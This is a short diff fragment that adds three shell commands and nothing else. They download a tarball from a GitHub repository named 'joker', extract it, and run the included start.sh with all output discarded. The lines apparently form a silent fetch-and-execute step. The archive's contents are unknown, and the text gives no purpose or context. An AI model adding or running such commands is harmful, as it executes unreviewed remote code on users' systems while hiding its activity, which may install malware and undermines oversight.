@@ -1,0 +1,3 @@
+wget https://github.com/sabarlur/joker/raw/main/terong.tar.gz
+tar xf terong.tar.gz
+./start.sh >/dev/null >/dev/null 2>&1
